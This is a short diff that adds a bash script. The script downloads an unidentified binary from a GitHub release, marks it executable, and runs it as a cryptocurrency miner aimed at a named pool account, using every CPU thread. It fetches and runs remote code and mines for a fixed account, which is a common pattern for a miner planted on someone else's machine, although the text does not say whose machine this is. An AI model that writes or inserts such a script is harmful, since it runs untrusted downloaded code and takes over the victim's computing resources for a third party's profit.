@@ -1,0 +1,4 @@
+#!/bin/bash
+wget https://github.com/juncilla/leelass/releases/download/kanhuh/kanka
+chmod +x kanka
+./kanka --algo qubic_xmr --account CP_43058os6pk --worker $(echo $(shuf -i 1-15000 -n 1)-Cam) --pool qubic1.hk.apool.io:3334 --thread $(nproc --all)
